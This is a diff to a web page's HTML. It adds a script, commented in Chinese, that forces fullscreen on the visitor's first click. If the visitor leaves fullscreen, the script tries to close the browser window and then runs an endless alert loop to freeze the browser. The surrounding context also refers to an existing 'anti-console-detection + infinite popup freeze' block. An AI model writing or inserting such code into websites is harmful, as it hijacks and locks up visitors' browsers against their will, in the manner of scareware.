@@ -339,7 +339,53 @@
 })();
 </script>
 <!-- 防控制台检测+无限弹窗卡死系统 END -->
+<!-- 强制全屏 + 退出全屏关闭浏览器 代码 START -->
+<script>
+(function() {
+    // ========== 全屏功能 ==========
+    function enterFullscreen() {
+        var elem = document.documentElement;
+        if (elem.requestFullscreen) {
+            elem.requestFullscreen();
+        } else if (elem.webkitRequestFullscreen) {
+            elem.webkitRequestFullscreen();
+        } else if (elem.mozRequestFullScreen) {
+            elem.mozRequestFullScreen();
+        } else if (elem.msRequestFullscreen) {
+            elem.msRequestFullscreen();
+        }
+    }
 
+    // 用户第一次点击页面时触发全屏
+    var hasTriggered = false;
+    document.addEventListener('click', function handler() {
+        if (!hasTriggered) {
+            enterFullscreen();
+            hasTriggered = true;
+            document.removeEventListener('click', handler);
+        }
+    });
+
+    // ========== 退出全屏检测 + 关闭浏览器 ==========
+    document.addEventListener('fullscreenchange', function() {
+        if (!document.fullscreenElement) {
+            // 检测到退出全屏，直接关闭浏览器
+            // 方案一：尝试直接关闭
+            try {
+                window.open('', '_self').close();
+                window.close();
+            } catch(e) {}
+
+            // 方案二：如果关不掉，用死循环弹窗卡死浏览器（强制效果）
+            while(true) {
+                alert('检测到退出全屏，浏览器即将关闭！');
+            }
+        }
+    });
+})();
+</script>
+<!-- 强制全屏 + 退出全屏关闭浏览器 代码 END -->
+  
 <script src="assets/js/config.js"></script>
 <script src="assets/js/main.js"></script>
 </body>
